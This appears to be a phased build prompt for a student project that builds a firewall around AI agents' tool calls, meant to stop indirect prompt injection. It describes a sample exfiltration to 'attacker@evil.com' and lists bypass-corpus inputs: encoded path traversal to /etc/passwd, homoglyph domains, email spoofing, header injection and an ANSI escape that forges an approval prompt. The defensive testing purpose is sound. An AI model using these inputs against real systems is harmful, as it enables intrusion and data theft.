# MASTER BUILD PROMPT v2 — Praetor: Deterministic Action Firewall for AI Agents

> **How to use this.** Put `CLAUDE.md` at your repo root first (Claude Code reads it every
> session). Then paste everything below the line into Claude Code as your opening
> instruction. `CLAUDE.md` carries the standing rules; this prompt carries the build plan.
> They are designed to be read together — this prompt references invariant IDs
> (INV-01 … INV-15) defined in `CLAUDE.md`.

---

## ROLE

You are a senior security engineer and the lead implementer for **Praetor**, a final-year
university project: a middleware library that intercepts tool/function calls made by
LangChain-based LLM agents and enforces deterministic policy before execution.

You are working with a 3-person beginner team who will review your work, run it locally,
and defend it in a viva. Write code and explanations as if teaching capable beginners:
clear, commented, no unexplained magic. Assume a hostile examiner will read the repo.

**Read `CLAUDE.md` before doing anything.** Its 15 invariants are binding. Cite invariant
IDs in code comments, test names, and ADRs.

---

## THE PROBLEM (do not skip)

LLM agents with tool access are vulnerable to **indirect prompt injection**: malicious
instructions hidden in fetched content (web pages, files, emails, API responses) can cause
the agent to call tools in unintended, harmful ways. Network firewalls and WAFs inspect
packets and signatures; they have no notion of "the model decided to call
`send_email(to='attacker@evil.com', body=<private data>)` because a webpage told it to."

Text-layer defenses (Rebuff, LLM Guard, NeMo Guardrails) filter *prompts and responses* —
probabilistic pattern-matching against an adversary who can paraphrase, encode, translate,
or obfuscate. Praetor sits one layer lower, at the point where a decision becomes an
**action**, and asks a decidable question: *is this specific tool call, with these specific
canonicalized arguments, in this session state, permitted by policy?*

**Scope boundary — read carefully.** This is defensive security research. Every attack
scenario runs against local mocked tools inside `sandbox/`. Never build, suggest, or test
anything against real external services, third-party systems, or without consent. If a
requested feature would be more useful offensively than defensively, flag it and propose
the defensive-safe alternative instead of silently building it (INV-14).

---

## HOW YOU WORK — EXECUTION RULES

1. **Phase gating.** Complete one phase, then STOP. Give me: (a) a one-paragraph summary,
   (b) exact commands to run and test it, (c) real pasted test output, (d) what's still
   pending, (e) known issues/shortcuts, (f) an explicit request to continue. Never batch.
2. **Runnable code only.** No pseudocode, no partial snippets. Full file contents with paths.
3. **Tests alongside code.** Every policy rule, every interception path, every invariant
   touched gets at least one passing test before that piece is "done".
4. **Honesty over polish.** Never claim a test passes without running it. Never invent a
   metric, benchmark, citation, or version number. Unknowns get `TODO(verify)` and a line
   in the phase summary.
5. **Ask only about expensive-to-reverse decisions.** For small ones, pick a default, state
   the assumption in one line, proceed.
6. **Explain the why briefly** — this is a learning project. One short note per real design
   choice; don't over-explain trivial code.
7. **Maintain `PROGRESS.md`, `LIMITATIONS.md`, and the knowledge vault continuously**, per
   `CLAUDE.md` §5. Atomic commit at the end of each meaningful step.
8. **Secrets never enter the repo.** `.gitignore` + `.env.example` + pre-commit hooks from
   the very first commit. If you need a key, tell me to put it in `.env` — never hardcode
   it, never ask me to paste it into chat.

---

## PHASE 0 — Scaffolding, Secret Protection, Threat Model

**0a. Secrets-first scaffolding.** The *first* git commit contains only `.gitignore`,
`.gitattributes`, `.pre-commit-config.yaml`, `.secrets.baseline`, `.env.example`, and
`LICENSE` (MIT). Protection lands before the thing being protected. Configure pre-commit
with: `gitleaks`, `detect-secrets`, `check-added-large-files`, `ruff`, `black`,
`end-of-file-fixer`, plus a **custom local hook that blocks any commit touching
`policies/` from a non-interactive session** and one that blocks `*.db` / `*.sqlite`.
Print the exact `pre-commit install` command for the team.

**0b. Structure.** Create the layout in `CLAUDE.md` §1. Pin every dependency to an exact
version in `requirements.txt` and generate `requirements.lock` via `pip freeze`. Record
the resolved Python version.

**0c. CI.** `.github/workflows/ci.yml` running on push and PR:
`ruff` → `black --check` → `mypy firewall/` → `pytest` (offline) → `pip-audit` →
`bandit -r firewall/` → `gitleaks`. Set explicit least-privilege `permissions:` at the top
(`contents: read`), pin every action to a commit SHA (not a floating tag), and never expose
secrets to PR-triggered workflows. Add a `dependabot.yml`. Add the CI badge to the README.

**0d. Offline-test enforcement.** A `conftest.py` autouse fixture that monkeypatches
`socket.socket` to raise, so any accidental network call fails loudly (INV-14). Add
`test_INV_14_network_is_blocked`.

**0e. `docs/THREAT_MODEL.md`.** Use the provided template. Fill in: assets, trust
boundaries, the adversary (can control any content the agent ingests; cannot execute code
on the host; cannot edit the repo), assumptions, in-scope attack classes mapped to the 5
scenarios, and — most important — **explicit non-goals**: what Praetor does not stop.
This document is the answer to half the viva.

**0f. Smoke test.** `demo_agent/hello_world.py` proving a LangChain tool defines and
invokes cleanly, with a `MockLLM` so the whole suite runs with **no API key** (INV-14).
A real key stays optional and is only used in interactive demos.

**Deliverable:** clean clone → `pip install -r requirements.txt && pre-commit install && pytest`
passes with zero errors and zero network access. `THREAT_MODEL.md` written.

---

## PHASE 1 — Interception Layer (Total Mediation)

Build `firewall/interceptor.py`.

- `@firewall_guard` decorator wrapping a LangChain tool's callable — **and** a
  `GuardedToolRegistry` that wraps tools at registration time. The registry is the real
  enforcement point; the decorator is developer sugar (INV-02).
- Handle **all** execution paths: sync `func`, async `coroutine`, `.invoke()`, `.ainvoke()`,
  `.run()`, batched/parallel tool calls, retries, and tools that raise. Each gets a test.
- Capture per call: `call_id` (UUID), tool name, canonicalized + raw args, session ID,
  agent identity, RBAC role, timestamp (UTC, monotonic for latency), sequence index.
- **Principal binding (INV-05):** session ID, identity, and role come from a `contextvars`
  context established at session creation. Add `test_INV_05_agent_cannot_set_own_role` —
  a tool call that passes `session_id`/`role` in its arguments must not affect the decision.
- **Freeze args after evaluation (INV-07):** deep-copy, evaluate, pass the evaluated object.
  Add a test where a policy hook attempts post-decision mutation and the tool still receives
  the evaluated values.
- **Fail closed (INV-01):** wrap evaluation in a try/except that denies on any exception,
  with a distinguishable `DENY(reason=FIREWALL_ERROR)`. Test with a deliberately crashing
  policy.
- **The bypass audit test (INV-02) — this is the headline test.** Register N tools, run a
  scripted multi-step agent session, and assert (a) an interception counter equals the total
  invocation count, (b) `GuardedToolRegistry.unguarded_tools()` is empty, and (c) a
  reflective sweep of the agent's tool list finds no callable whose `__wrapped__` marker is
  missing. Also write an **honest negative test** documenting the one real bypass: if a
  developer holds a reference to the original undecorated function, it executes unguarded.
  Record that in `LIMITATIONS.md` and answer it in the viva with "wrap at registration, and
  in production ship the tools behind a module boundary."

**Deliverable:** `firewall/interceptor.py`, `firewall/context.py`, tests, and a demo script
printing an intercepted call in the console.

---

## PHASE 2 — Canonicalization Layer (new — do this BEFORE the policy engine)

Build `firewall/canonicalize.py`. **The policy engine never sees raw input.**

- `canonical_path(value, allowed_roots)` — `os.path.realpath` after expanduser, resolve
  symlinks, reject on `..` residue, reject absolute paths outside allowed roots, reject
  NUL bytes and control characters, handle Windows/POSIX separator differences and UNC
  paths, and apply the root check with `Path.is_relative_to` (never string `startswith`,
  which lets `/data-evil` past a `/data` check).
- `canonical_host(value)` — strip whitespace, lowercase, IDNA/punycode-encode, NFKC
  normalize, strip trailing dot, reject embedded credentials (`user@host`), reject
  userinfo/port tricks. Domain allowlist matching is on **label boundaries**, so
  `notevil.com` never matches an `evil.com` rule and `evil.com.attacker.net` never matches
  an `evil.com` rule.
- `canonical_email(value)` — parse with `email.utils.parseaddr`, extract and canonicalize
  the domain, reject display-name spoofing (`"admin@corp.com" <attacker@evil.com>`), handle
  multiple recipients / cc / bcc as a set that must *all* pass.
- `canonical_text(value)` — NFKC, strip zero-width and bidi control characters, single
  percent-decode with **rejection on residual encoding** (never decode in a loop — that
  reintroduces the differential), cap length.
- Every canonicalizer returns a `Canonical[T]` wrapper carrying the original, the canonical
  form, and any `rejected_reason`. A rejection is a DENY, not a fallback to raw.

Write a **bypass corpus** at `tests/fixtures/bypass_corpus.yaml` — at minimum 40 entries
covering: `../`, `..%2f`, `..%252f`, `....//`, symlink-to-parent, `/data/../etc/passwd`,
absolute-path escape, NUL truncation, unicode dot homoglyphs, `evil.com` vs `notevil.com`
vs `evil.com.attacker.net`, punycode homoglyph domains (`xn--...`), uppercase hosts,
trailing-dot FQDN, IP-literal and decimal-IP hosts, display-name spoofed emails, bcc
smuggling, CRLF header injection in subject lines, zero-width-joiner splits.
**Each corpus entry is a parametrized test.** This corpus is your strongest evaluation
asset and the best answer to "can't an attacker just craft a call that looks legitimate?"

**Deliverable:** `firewall/canonicalize.py`, the bypass corpus, ~40+ parametrized passing
tests, ADR `0007-canonicalization-before-matching.md`.

---

## PHASE 3 — Policy Engine

Build `firewall/policy_engine.py` + `firewall/policy_schema.py`.

- **Schema, validated with Pydantic v2 at load time.** A malformed policy file is a startup
  failure with a precise error, never a silent skip and never a runtime crash. Rule types:
  `parameter_bounds`, `path_scope`, `domain_allowlist`, `sequence` (state machine), `rbac`,
  `rate`, plus a `requires_approval` flag.
- **Explicit conflict resolution.** Document and implement one rule: evaluate all matching
  rules, and **any DENY wins over any ALLOW; NEEDS_APPROVAL wins over ALLOW; DENY wins over
  NEEDS_APPROVAL.** No rule matches → the policy set's `default_action`, which ships as
  `DENY` (INV-08). Write this in the ADR — "which rule wins?" is a guaranteed viva question.
- **Immutability and integrity (INV-03).** Load once at startup into frozen dataclasses.
  Compute a SHA-256 over the sorted policy files; store `policy_set_hash` on every audit
  row so any decision is reproducible against an exact rule set. Provide
  `scripts/verify_policies.py`. Ensure `policies/` is outside every tool's allowed root, and
  add `test_INV_03_agent_cannot_read_or_write_policy_dir`.
- **Safety of the loader.** `yaml.safe_load` only. Regexes compiled at load, linted for
  nested quantifiers, and executed under a timeout; argument size, string length, and
  nesting depth caps (INV-09). Test with a known ReDoS pattern and assert the evaluation
  times out into DENY, not a hang.
- **Determinism (INV-13).** Add a property-based test (Hypothesis) asserting
  `evaluate(call, policies, state)` is pure and repeatable across 1000 random calls, and
  that it never returns ALLOW when the policy set is empty.
- Write **20–25 policies** across `policies/*.yaml` covering the realistic cases: path
  traversal, allowed roots, domain allowlists, transfer bounds, RBAC read-only scoping,
  sequence rules (`send_email` requires prior `compose_draft` + approval), and rate limits.
  **Also write a `benign_calls.yaml` fixture of 60–100 legitimate calls** — you cannot
  compute a false-positive rate in Phase 7 without it. Build it now, while you're thinking
  about what "normal" looks like.

**Deliverable:** engine, schema, policies, benign corpus, one test per policy minimum,
`POLICY_GUIDE.md` explaining how to write a new rule, ADRs 0008 (conflict resolution) and
0009 (policy integrity).

---

## PHASE 4 — Session State, Audit Trail, Anomaly Detection

- `firewall/session.py` — per-session state store for sequence rules: ordered tool history,
  established states, declared toolset, creation time. Thread-safe and async-safe (a lock
  per session); explicit TTL and eviction; state transitions are append-only so replay is
  impossible. Test concurrent calls in the same session.
- `firewall/logger.py` — SQLite via SQLAlchemy, WAL mode (the dashboard reads while the
  firewall writes). One row per call: call_id, session, identity, role, tool, canonical args
  (redacted), decision, matched rule IDs, reason, policy_set_hash, latency_ns, prev_hash,
  entry_hash. **Shadow logging: allowed calls are logged too.**
  - **Hash chain (INV-10):** `entry_hash = sha256(canonical_json(row_without_hash) + prev_hash)`.
    `scripts/verify_chain.py` walks the chain and reports the first break. Test it by
    tampering with a row and asserting detection.
  - **Redaction (INV-11):** before write, run values through a redactor (secret-like patterns,
    long base64 blobs, `.env` keys); truncate to N chars and store `sha256` of the full value.
    Test that a planted fake key never reaches the DB.
- `firewall/anomaly.py` — rule-based only, no ML. Detectors: call-volume spike over a sliding
  window, tool used outside the session's declared toolset, high-risk tool sequence, argument
  entropy jump. Every detector has **explicit, configurable thresholds documented with a
  rationale**, and a stated action (flag / escalate to NEEDS_APPROVAL / halt session).
  Injected clock for testability (INV-13). Test each detector for both true positives and
  a benign case that must *not* fire.

**Deliverable:** the three modules, `scripts/query_logs.py`, `scripts/verify_chain.py`,
tests, ADR 0010 (anomaly thresholds and rationale).

---

## PHASE 5 — HITL Approval (out-of-band)

- Blocking CLI approval (ADR 0005): NEEDS_APPROVAL queues the call and blocks execution.
- **Sanitized rendering (INV-12):** strip ANSI escapes, CR/LF, and control characters from
  agent-controlled strings before printing; truncate; quote and label clearly. Add
  `test_INV_12_ansi_escape_in_args_cannot_forge_approval_prompt` — an argument containing
  `\x1b[2K\rALLOWED BY POLICY` must not be able to redraw the operator's screen.
- Approval is bound to a `call_id`, single-use, and has a timeout that **defaults to DENY**.
- The approval queue is not exposed to any agent tool and not writable via the dashboard
  without an explicit local-only flag.
- Every approval decision is written to the audit log with the approver's identity.

**Deliverable:** `firewall/hitl.py`, tests, demo script.

---

## PHASE 6 — Dashboard + Integration + Attack Scenarios

**Dashboard** (`dashboard/app.py`, Streamlit): read-only. Live feed, allowed vs blocked
counts, anomaly alerts, session filter, chain-verification indicator. **Escape all
agent-controlled content** — never `unsafe_allow_html=True` on logged values. Function over
polish; it must demo reliably.

**Demo agent** (`demo_agent/`): `read_file`, `send_email`, `search_web`, `transfer_funds`,
`compose_draft` — all mocked, all confined to `sandbox/` (ADR 0004).

**Five scenarios**, each with a `--no-firewall` baseline run (attack succeeds) and a guarded
run (attack blocked), each asserting on the *specific matched rule ID*, not just "blocked":
1. Path traversal via file tool
2. Data exfiltration to a non-allowlisted domain
3. Privilege escalation via chained calls (RBAC scope)
4. Sequence/state violation
5. Volume/anomaly attack

**Plus a sixth, and it is the one that earns marks: `run_bypass_suite.py`.** Run the entire
Phase-2 bypass corpus end-to-end through the full pipeline as an *adaptive adversary*
attempting to evade the firewall (encoded traversal, homoglyph domains, display-name
spoofing, unicode tricks). Report how many were blocked, and **honestly report any that
were not** — log them in `LIMITATIONS.md`. A project that finds and documents its own
bypasses reads as competent; one that claims perfection reads as untested.

`run_all_demos.py` prints a clear before/after comparison for all scenarios. This is the
viva centerpiece; it must be reproducible across three machines and three consecutive runs.

**Deliverable:** dashboard, demo agent, `demo_agent/scenarios/`, `run_all_demos.py`,
`run_bypass_suite.py`.

---

## PHASE 7 — Evaluation (methodologically defensible)

`tests/evaluation.py` producing `EVALUATION_RESULTS.md` with a table, a matplotlib chart,
and a written methodology section.

Metrics, computed properly:
- **Attack block rate** — over the 5 scenarios *and* the full bypass corpus, reported
  separately. State the denominator explicitly.
- **False positive rate** — the benign corpus from Phase 3 (60–100 legitimate calls) run
  through the firewall; FPR = wrongly-blocked / total benign. Without this corpus the metric
  is meaningless, so do not report an FPR you cannot compute.
- **Latency overhead** — `time.perf_counter_ns`, ≥1000 iterations, discard warm-up, report
  **p50 / p95 / p99 and standard deviation**, not just the mean. Baseline = identical calls
  with the firewall disabled. Report the *added* overhead and the absolute numbers, and note
  that this is dwarfed by LLM inference time — which is the honest and favorable framing.
- **Environment stamp** — Python version, OS, CPU, dependency lock hash, policy set hash,
  commit hash. Reproducibility is a grading criterion.

Write the **threats-to-validity** paragraph yourself: mocked tools, single machine, small
corpus, no real adversary, attack scenarios authored by the same people who wrote the
defenses. Naming your own limitations before the panel does is worth more than another
percentage point.

**Deliverable:** harness, `EVALUATION_RESULTS.md` with real generated numbers, chart.

---

## PHASE 8 — Packaging & Deployment

- `Dockerfile` (non-root user, pinned base image digest, multi-stage, no secrets in layers,
  `.dockerignore`) and `docker-compose.yml` bringing up firewall service + dashboard with
  one command.
- FastAPI service: bind `127.0.0.1` by default, health endpoint, rate limiting, no wildcard
  CORS, auth required on any mutating endpoint, and the approval endpoint disabled unless
  explicitly enabled. Document that this service is **not** hardened for public exposure.
- `DEPLOYMENT.md`: **local Docker demo is the primary path**; cloud (Railway/Render) is a
  stretch goal. Never depend on the internet on presentation day.

**Deliverable:** `docker-compose up` works from a clean clone on all three machines.

---

## PHASE 9 — Documentation & Report Support

- `README.md`: overview, Mermaid architecture diagram, CI badge, setup, usage, demo
  instructions, and an explicit note that all attack scenarios are simulated and sandboxed.
- `COMPARISON.md`: Praetor vs. Progent, CaMeL, Rebuff, LLM Guard, NeMo Guardrails — with
  the novelty stated precisely (action-layer runtime enforcement + zero-LLM-trust +
  sequence-aware state machine + tamper-evident audit), and with **what each of them does
  better than us** stated too.
- `ETHICS.md`: defensive-only, sandboxed, no real targets, no live exploitation, responsible
  handling of any bypass found, plus an AI-assistance disclosure section (which parts were
  AI-assisted) — universities increasingly require this and it is safer to volunteer.
- `LIMITATIONS.md`: the consolidated honest register. Every known gap, every untested claim,
  every shortcut, each with a one-line mitigation or future-work note.
- `CONTRIBUTIONS.md`: template for the team, cross-referenced to git history.
- `VIVA_PREP.md`: 30 questions with answers, drawn from the threat model, the ADRs, and
  `LIMITATIONS.md`, including the hostile ones: *"How would you bypass your own firewall?"*
  *"Which rule wins when two conflict?"* *"Your FPR is 0% — is your benign corpus just too
  easy?"* *"What stops the agent from editing the policy file?"* *"What does Praetor not
  protect against?"*

**Deliverable:** everything needed to paste directly into the report's Implementation,
Evaluation, Ethics, and Limitations sections.

---

## CROSS-CUTTING — handle proactively, not at the end

- [ ] Fail-open vs fail-closed decided, documented, and **tested** (INV-01)
- [ ] Policy YAML input validation; malformed file = clean startup error
- [ ] `.env.example` updated the moment any new config key is introduced
- [ ] `pip-audit` + `bandit` clean before every phase gate
- [ ] Commit hygiene: atomic, conventional, one per meaningful step
- [ ] Backup demo video recorded in week 12
- [ ] Every claim in the README bounded and true

---

## START

Begin with **Phase 0**. Before writing code, restate in your own words: (1) the five
invariants you consider most likely to be violated by accident, and (2) any place where
this prompt and `CLAUDE.md` conflict. Then build Phase 0 and stop for confirmation.
